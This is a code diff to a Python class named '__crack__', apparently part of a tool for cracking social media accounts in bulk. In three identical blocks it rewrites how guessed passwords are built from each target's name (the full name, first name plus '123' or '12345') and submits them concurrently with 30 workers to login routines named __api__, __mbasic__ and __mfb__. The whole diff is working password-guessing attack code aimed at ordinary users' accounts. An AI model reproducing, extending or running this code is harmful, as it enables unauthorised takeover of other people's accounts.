@@ -785,17 +785,13 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        bb = yntkts.split('<=>')
-                        xz = bb[1].split(' ')
-                        if len(xz)>=6:
-                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=2:
-                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=3:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
+                        uid, name = yntkts.split('<=>')
+                        xz = name.split(' ')
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
-                        __yayanXD__.submit(self.__api__, bb[0], pwx)
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                        __yayanXD__.submit(self.__api__, uid, pwx)
                     except:
                         pass
 
@@ -808,17 +804,13 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        bb = yntkts.split('<=>')
-                        xz = bb[1].split(' ')
-                        if len(xz)>=6:
-                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=2:
-                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=3:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
+                        uid, name = yntkts.split('<=>')
+                        xz = name.split(' ')
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
-                        __yayanXD__.submit(self.__mbasic__, bb[0], pwx)
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                     except:
                         pass
 
@@ -831,17 +823,13 @@ class __crack__:
             with YayanGanteng(max_workers=30) as (__yayanXD__):
             	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                     try:
-                        bb = yntkts.split('<=>')
-                        xz = bb[1].split(' ')
-                        if len(xz)>=6:
-                            pwx = [ xz[0], xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=2:
-                            pwx = [ xz[0]+"123", xz[0]+"1234", xz[0]+"12345" ]
-                        elif len(xz)<=3:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
+                        uid, name = yntkts.split('<=>')
+                        xz = name.split(' ')
+                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                         else:
-                            pwx = [ xz[0]+"123", xz[0]+"12345" ]
-                        __yayanXD__.submit(self.__mfb__, bb[0], pwx)
+                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
+                        __yayanXD__.submit(self.__mfb__, uid, pwx)
                     except:
                         pass
 
